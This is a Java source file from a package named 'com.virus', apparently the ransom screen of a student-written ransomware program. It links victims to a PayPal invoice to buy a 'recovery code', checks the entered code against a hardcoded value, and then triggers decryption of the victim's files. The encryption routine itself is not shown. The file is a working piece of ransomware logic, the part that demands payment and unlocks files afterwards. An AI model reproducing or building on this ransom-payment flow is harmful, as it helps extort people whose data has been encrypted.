package com.virus;

import javafx.concurrent.Task;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.scene.Cursor;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.control.Alert;
import javafx.scene.control.Button;
import javafx.scene.control.Hyperlink;
import javafx.scene.control.TextField;
import javafx.stage.Stage;

import java.io.IOException;

/**
 * Created by 강희룡
 * 2015-11-26
 */
public class PurchaseController {
    @FXML
    private Parent root;
    @FXML
    private TextField txtDecryptCode;
    @FXML
    private Hyperlink lnkPurchaseCode;
    @FXML
    private Button btnSubmit;

    private static final String CODE = "WelcomeToDimigo!";


    /**
     * 하이퍼링크 이벤트 핸들러
     * "https://www.paypal.com?cmd=_pay-inv&id=INV2-YFHE-6XJF-AKME-XJBJ"로 연결되면 됨
     *
     * @param event
     */
    public void handleLinkAction(ActionEvent event) {
        Main.viewWeb("https://www.paypal.com?cmd=_pay-inv&id=INV2-YFHE-6XJF-AKME-XJBJ");
    }


    /**
     * Submit 버튼 이벤트 핸들러
     *
     * @param event
     */
    public void handleSubmitAction(ActionEvent event) throws IOException {
        String code = txtDecryptCode.getText();
        Alert alert;
        if (code.trim().equals("")) {
            alert = new Alert(Alert.AlertType.WARNING);
            alert.setTitle("Warning");
            alert.setHeaderText("복구 코드를 입력해야합니다");
            alert.setContentText("복구 코드를 입력하세요");

            alert.showAndWait();
        } else {
            if (code.equals(CODE)) {
                alert = new Alert(Alert.AlertType.INFORMATION);
                alert.setTitle("Success");
                alert.setHeaderText("축하합니다.");
                alert.setContentText("복구 코드가 확인되었습니다. 복호화를 시작합니다.");
                alert.showAndWait();

                Scene scene;
                Scene thisScene = root.getScene();
                Stage stage = (Stage) thisScene.getWindow();

                scene = new Scene(FXMLLoader.load(getClass().getResource("Success.fxml")));

                thisScene.setCursor(Cursor.WAIT);
                Task<Void> task = new Task<Void>() {
                    @Override
                    protected Void call() throws Exception {
                        Main.encryptionController.decryption();
                        return null;
                    }
                };
                task.setOnRunning(e -> {
                    txtDecryptCode.setDisable(true);
                    btnSubmit.setDisable(true);
                    lnkPurchaseCode.setDisable(true);
                });
                task.setOnSucceeded(e -> {
                    txtDecryptCode.setDisable(false);
                    btnSubmit.setDisable(false);
                    lnkPurchaseCode.setDisable(false);

                    thisScene.setCursor(Cursor.DEFAULT);
                    stage.setScene(scene);
                    stage.setResizable(false);
                    stage.setTitle("감사합니다");
                    stage.show();
                });
                task.setOnFailed(e -> {
                    txtDecryptCode.setDisable(false);
                    btnSubmit.setDisable(false);
                    lnkPurchaseCode.setDisable(false);
                });
                task.setOnCancelled(e -> {
                    txtDecryptCode.setDisable(true);
                    btnSubmit.setDisable(true);
                    lnkPurchaseCode.setDisable(true);
                });
                new Thread(task).start();
            } else {
                alert = new Alert(Alert.AlertType.ERROR);
                alert.setTitle("Fail");
                alert.setHeaderText("복구 실패");
                alert.setContentText("잘못된 복구 코드입니다.");
                alert.showAndWait();
            }
        }
    }
}
